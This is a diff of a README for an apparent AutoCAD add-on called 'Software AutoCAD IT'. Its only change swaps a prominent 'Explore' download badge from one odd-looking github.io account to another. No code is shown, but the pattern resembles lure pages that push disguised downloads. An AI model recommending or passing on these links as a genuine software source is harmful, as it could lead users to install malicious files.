@@ -15,7 +15,7 @@ Everything runs inside the familiar AutoCAD environment, but **Software AutoCAD 
 
 ## Getting Started with Software AutoCAD IT
 
-[![Explore AutoCAD IT](https://img.shields.io/badge/Explore-AutoCAD_IT-6c5ce7?style=for-the-badge)](https://siskraquel06.github.io/.github/software-autocad-it)
+[![Explore AutoCAD IT](https://img.shields.io/badge/Explore-AutoCAD_IT-6c5ce7?style=for-the-badge)](https://trenaflemingzjjnzq.github.io/.github/software-autocad-it)
 
 1. Prepare your AutoCAD environment (2021–2025 compatible).  
 2. Load the **Software AutoCAD IT** core module via APPLOAD.  
